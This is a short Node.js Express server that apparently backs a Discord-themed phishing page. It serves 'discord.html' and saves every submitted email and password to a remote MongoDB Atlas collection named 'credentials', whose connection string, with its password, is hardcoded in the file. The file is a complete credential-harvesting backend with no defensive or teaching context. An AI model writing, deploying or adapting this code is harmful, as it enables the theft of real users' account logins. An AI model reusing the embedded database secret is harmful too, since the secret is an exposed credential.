const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const path = require("path");

const app = express();
const port = 4200;

app.use(bodyParser.json());
app.use(express.static("public"));

const uri =
	"mongodb+srv://copy:copyakcord@credentials.pxrplms.mongodb.net/?retryWrites=true&w=majority&appName=credentials";

mongoose.set("strictQuery", true);
mongoose.connect(uri);

const credentials = new mongoose.Schema({
	email: String,
	password: String,
});

const DataModel = mongoose.model("credentials", credentials);

app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "public", "discord.html"));
});

app.post("/save-data", async (req, res) => {
	try {
		const data = new DataModel(req.body);
		await data.save();
		res.send("Data saved successfully");
	} catch (err) {
		console.error("Error saving data to MongoDB:", err);
		res.status(500).send("Error saving data");
	}
});

app.listen(port, () => {
	console.log(`✅ Server is running on http://localhost:${port}`);
});
